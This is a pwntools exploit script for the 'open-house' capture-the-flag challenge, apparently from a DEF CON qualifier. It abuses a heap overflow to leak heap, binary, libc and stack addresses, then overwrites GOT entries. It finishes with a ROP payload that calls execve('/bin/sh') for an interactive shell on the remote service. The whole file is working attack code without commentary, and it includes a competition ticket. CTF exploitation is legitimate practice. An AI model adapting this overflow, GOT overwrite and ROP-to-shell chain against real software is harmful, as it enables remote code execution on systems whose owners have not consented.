#!/usr/bin/python3

from pwn import *

exe = ELF('open-house_patched', checksec=False)
libc = ELF('libc6_2.37-0ubuntu1_i386.so', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: r.sendlineafter(msg, data)
sa = lambda msg, data: r.sendafter(msg, data)
sl = lambda data: r.sendline(data)
s = lambda data: r.send(data)
sn = lambda msg, num: sla(msg, str(num).encode())

def md(choice, id, data = b'chino'):
    sla(b'> ', choice)
    sn(b'?\n', id)
    if choice == b'm':
        sla(b'with?\n', data)
        
def c(data):
    sla(b'> ', b'c')
    sla(b'review!\n', data)
  
def v(): sla(b'> ', b'v')
def q(): sla(b'> ', b'q')

heap_off = 0x2650
libc_off = 0x2287f8

exe.got['free'] = 0x3124
exe.got['fgets'] = 0x3128
exe.sym['call'] = 0x1941
exe.sym['pop_ebx'] = 0x00001022

def GDB():
    gdb.attach(r, gdbscript='''
        # b*0x56556b36
        # b*0x56556790
        # ni
        # c
        # c 15
        # ni
        # c 6
    ''')


if args.REMOTE:
    r = remote('open-house-6dvpeatmylgze.shellweplayaga.me', 10001)
    libc.sym['write'] = 0x10d910
    libc.sym['fgets'] = 0x71de0
    sla(b': ', b'ticket{PoolAgent506n23:_mTCNOMf4biynG12brYzrrO_CvEVnEyzzixj0WZpmkbxbTfC}')
else:
    r = process(exe.path)
    GDB()

c(b'chino') # open option modify, delete
md(b'd', 11)
md(b'm', 10, b'a'*0x1fb + b'abcd')
c(b'chino')
v()
r.recvuntil(b'abcd\n')
heap = u32(r.recv(4))
info('heap: ' + hex(heap))

payload = b'a'*0x200 + p32(heap - 0x22ac)+ p32(heap-0x2090)
md(b'm', 4, payload)
v()
r.recvuntil(b'\n\n**** - ')
bin = u32(r.recv(4))
exe.address = bin - 0x3164
info('bin: ' + hex(exe.address))

payload = b'a'*0x200 + p32(exe.got['free'])+ p32(heap-0x2090)
md(b'm', 4, payload)
v()
r.recvuntil(b'\n\n**** - ')
libc.address = u32(r.recv(4)) - libc.sym['free']
info('libc: ' + hex(libc.address))

payload = b'a'*0x200 + p32(libc.sym['environ'])+ p32(heap-0x2090)
md(b'm', 4, payload)
v()
r.recvuntil(b'\n\n**** - ')
stack = u32(r.recv(4))
info('stack: ' + hex(stack))

payload = b'a'*0x200 + p32(exe.got['free'])+ p32(heap-0x2090)
md(b'm', 4, payload)
md(b'm', 5, p32(libc.sym['write']+0x2c) + p32(libc.sym['fgets']))

payload = b'a'*0x200 + p32(stack-0x100)+ p32(heap-0x2090)
md(b'm', 4, payload)
payload = p32(exe.sym['pop_ebx']) + p32(stack-0xc8) + p32(exe.sym['call']) + b'\x00'*0x28 + p32(0xb) + b'/bin/sh\x00' + b'\x00'*0x8 + p32(libc.sym['write']+0x2c)
md(b'm', 5, payload)

r.interactive()
